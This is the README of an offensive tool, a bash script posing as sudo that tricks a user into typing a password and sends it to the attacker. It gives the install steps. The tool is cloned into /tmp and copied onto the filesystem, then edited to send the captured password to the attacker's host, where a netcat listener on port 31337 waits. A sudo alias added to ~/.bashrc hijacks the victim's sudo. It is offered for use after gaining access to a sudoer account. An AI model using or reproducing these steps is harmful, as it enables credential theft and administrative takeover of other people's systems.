# Sudo backdoor
This bash script mimics the original sudo binary behavior to con a user into
typing his password.

The backdoored sudo displays different message based on the locale language used
on the host (english and french for the time being).

The password is sent over the network for the attacker to retrieve.

## Installation
Once you gain access to a user account that you suspect being sudoer, you can
place this backdoored sudo script to gain administrative control over the host.

```
cd /tmp
git clone https://github.com/nisay759/sudo-backdoor.git
cd sudo-backdoor
cp sudo.sh /somewhere/in/the/filesystem/sudo
```

Now you should modify the script (the line before the last one) to forward the
password to your host, instead of localhost. You should fire up a netcat
listener on port 31337 and wait.

Next, you want the user to call the backdoored sudo instead of the original one:

```
echo 'alias sudo="/somewhere/in/the/filesystem/sudo"' >> ~/.bashrc
```
for example.

## TODO
- [ ] Add support for other languages
- [ ] Encrypt the password before sending it
